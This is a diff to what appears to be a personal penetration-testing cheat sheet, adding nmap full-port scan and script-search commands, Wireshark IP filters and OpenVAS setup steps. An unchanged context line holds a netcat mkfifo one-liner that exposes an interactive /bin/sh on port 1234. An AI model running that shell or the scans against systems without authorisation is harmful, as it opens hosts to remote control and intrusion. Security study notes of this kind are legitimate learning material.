@@ -52,6 +52,12 @@ nmap
     Update scripts:
     *$ nmap --script-updatedb*
 
+    Scan all TCP and UDP Ports 
+    *$ nmap -v -sU -sS -p- -A -T4 ip *
+
+    Nmap search through Nmap Scripts for a specific keyword
+    *$  ls /usr/share/nmap/scripts/\* | grep ftp *
+
 Metaslpoit
    	Statring metasploit
     *$ service postgesql start && service metasploit start*
@@ -141,7 +147,10 @@ Wireshark
     libpcap and wincap libraries.
     network -> capture filters -> capture engine -> display filters
     follow TCP stream
-    tcp.port == 21
+    *tcp.port == 21
+    ip.src == 10.43.54.65 or ip.dst == 10.43.54.65
+    ip.addr != 10.43.54.65*
+
 
 
 Tcpdump
@@ -155,6 +164,12 @@ Tcpdump
 nc
     shell
         rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 1234 > /tmp/f
+
+OpenVAS
+    *$ apt-get update;  apt-get install openvas  openvas-setup 
+netstat -tulpn *
+    Login at
+    *https://localhost:9392 *
 
 gdb
     disas main or disassemble main
